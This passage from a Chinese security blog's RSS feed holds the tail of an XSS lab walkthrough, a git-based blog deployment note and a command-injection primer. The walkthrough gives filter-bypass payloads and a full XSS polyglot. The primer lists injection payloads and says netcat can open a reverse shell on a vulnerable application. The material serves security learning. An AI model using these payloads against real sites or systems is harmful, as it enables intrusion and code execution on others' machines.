		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;502&#34;
		data-flex-basis=&#34;1205px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;script&lt;/code&gt; 会从有效负载中删除，这是因为有一个过滤器可以去除任何具有潜在危险的单词。&lt;/p&gt;
&lt;p&gt;当一个单词从字符串中删除时，你可以尝试一个有用的技巧。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145609648.png&#34;
	width=&#34;399&#34;
	height=&#34;291&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145609648_hu_dbb025f2ebddacf7.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145609648_hu_27107828d168a61.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;137&#34;
		data-flex-basis=&#34;329px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;尝试输入有效负载 &lt;code&gt;&amp;lt;sscriptcript&amp;gt;alert(&#39;THM&#39;);&amp;lt;/sscriptcript&amp;gt;&lt;/code&gt; 并单击输入按钮，将看到一个带有字符串 THM 的警报弹出窗口。&lt;/p&gt;
&lt;h2 id=&#34;level-six&#34;&gt;Level Six:
&lt;/h2&gt;&lt;p&gt;与第二级类似，我们必须从 input 标签的 value 属性中转义，我们可以尝试 &lt;code&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;alert(&#39;THM&#39;);&amp;lt;/script&amp;gt; &lt;/code&gt;，但这似乎不起作用。让我们检查一下页面源代码，看看为什么这不起作用。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145640111.png&#34;
	width=&#34;470&#34;
	height=&#34;105&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145640111_hu_c413b54e424f2db4.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145640111_hu_358ff87cb4c56784.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;447&#34;
		data-flex-basis=&#34;1074px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;可以看到 &amp;lt; 和 &amp;gt; 字符从我们的 payload 中被过滤掉，从而阻止我们转义 IMG 标签。为了绕过过滤器，我们可以利用 IMG 标签的其他属性，比如 onload 事件。onload 事件将在 src 属性中指定的图像加载到网页后执行您选择的代码。&lt;/p&gt;
&lt;p&gt;让我们更改 payload 以反映这一点 &lt;code&gt;/images/cat.jpg&amp;quot; onload=&amp;quot;alert(&#39;THM&#39;);&lt;/code&gt; ，然后查看页面源，您将看到这将如何工作。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145659486.png&#34;
	width=&#34;535&#34;
	height=&#34;92&#34;
	srcset=&#34;https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145659486_hu_6e4c4cf7c64285c3.png 480w, https://Yerucrem.github.io/p/%E5%85%B3%E4%BA%8Exss%E5%9F%BA%E7%A1%80%E7%9A%84%E5%88%A9%E7%94%A8/image-20250318145659486_hu_9c074b55d4e67b25.png 1024w&#34;
	loading=&#34;lazy&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;581&#34;
		data-flex-basis=&#34;1395px&#34;
	
&gt;&lt;/p&gt;
&lt;h2 id=&#34;polyglots&#34;&gt;Polyglots:
&lt;/h2&gt;&lt;p&gt;XSS 多语言是一串文本，可以一站式转义属性、标签和绕过过滤器。可以在刚刚完成的所有 6 个级别上使用以下多语言，并且它会成功执行代码。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;jaVasCript&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:/*-/*&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/*\`/*&amp;#39;/*&amp;#34;/**/&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;cm&#34;&gt;/* */&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;onerror&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;THM&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;//%0D%0A%0d%0a//&amp;lt;/stYle/&amp;lt;/titLe/&amp;lt;/teXtarEa/&amp;lt;/scRipt/--!&amp;gt;\x3csVg/&amp;lt;sVg/oNloAd=alert(&amp;#39;THM&amp;#39;)//&amp;gt;\x3e
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>利用github实现自动部署</title>
        <link>https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%88%A9%E7%94%A8github%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/</guid>
        <description>&lt;h1 id=&#34;自动部署&#34;&gt;自动部署
&lt;/h1&gt;&lt;h2 id=&#34;参考&#34;&gt;参考
&lt;/h2&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://letere-gzj.github.io/hugo-stack/p/hugo/custom-blog/#32-github-action%e8%87%aa%e5%8a%a8%e9%83%a8%e7%bd%b2&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;【Hugo】Hugo + Github 免费部署自己的博客&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;首次部署&#34;&gt;首次部署
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git init
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git add .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git commit -m &lt;span class=&#34;s2&#34;&gt;&amp;#34;first commit&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git branch -M main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git remote add origin {你的github仓库地址}
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push -u origin main
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;更新&#34;&gt;更新
&lt;/h2&gt;&lt;p&gt;在dev目录下&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git init
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git add .
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git commit -m &amp;#34;update&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git branch -M main
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;git push 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;</description>
        </item>
        <item>
        <title>命令注入基础</title>
        <link>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
        
        <guid>https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
        <description>&lt;img src="https://Yerucrem.github.io/p/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/4e4cc31a34179ac0e517d1c37a2925a57eb72a8878519af127e313034f388b04.png" alt="Featured image of post 命令注入基础" /&gt;&lt;h1 id=&#34;命令注入&#34;&gt;命令注入
&lt;/h1&gt;&lt;h2 id=&#34;分类&#34;&gt;分类
&lt;/h2&gt;&lt;p&gt;命令注入主要可以通过以下两种方式之一进行检测：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;盲命令注入&lt;/li&gt;
&lt;li&gt;详细命令注入&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;方法&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;盲&lt;/td&gt;
          &lt;td&gt;这种类型的注入是在测试有效负载时应用程序没有直接输出的地方。您必须调查应用程序的行为，以确定您的有效负载是否成功。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;详细&lt;/td&gt;
          &lt;td&gt;这种类型的注入是测试有效负载后从应用程序获得直接反馈的地方。例如，运行 &lt;code&gt;whoami&lt;/code&gt; 命令以查看应用程序在哪个用户下运行。Web 应用程序将直接在页面上输出用户名。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;有用的有效载荷&#34;&gt;有用的有效载荷
&lt;/h2&gt;&lt;h3 id=&#34;linux&#34;&gt;Linux
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;有效载荷&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;whoami&lt;/td&gt;
          &lt;td&gt;查看应用程序在哪个用户下运行。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ls&lt;/td&gt;
          &lt;td&gt;列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ping&lt;/td&gt;
          &lt;td&gt;此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;sleep&lt;/td&gt;
          &lt;td&gt;这是测试应用程序盲目命令注入时的另一个有用有效负载，其中计算机未安装 &lt;code&gt;ping&lt;/code&gt;。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;nc&lt;/td&gt;
          &lt;td&gt;Netcat 可用于在易受攻击的应用程序上生成反向 shell。您可以使用此立足点在目标计算机上导航，以获取其他服务、文件或提升权限的潜在方法。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;windows&#34;&gt;windows
&lt;/h3&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;有效载荷&lt;/th&gt;
          &lt;th&gt;描述&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;whoami&lt;/td&gt;
          &lt;td&gt;查看应用程序在哪个用户下运行。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dir&lt;/td&gt;
          &lt;td&gt;列出当前目录的内容。您也许能够找到配置文件、环境文件（令牌和应用程序密钥）等文件，以及更多有价值的内容。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ping&lt;/td&gt;
          &lt;td&gt;此命令将调用应用程序以挂起。这在测试应用程序是否进行盲命令注入时非常有用。&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;timeout&lt;/td&gt;
          &lt;td&gt;此命令还将调用应用程序以挂起。如果未安装 &lt;code&gt;ping&lt;/code&gt; 命令，则它还可用于测试应用程序是否进行盲命令注入。&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
</description>
        </item>
        
    </channel>
</rss>
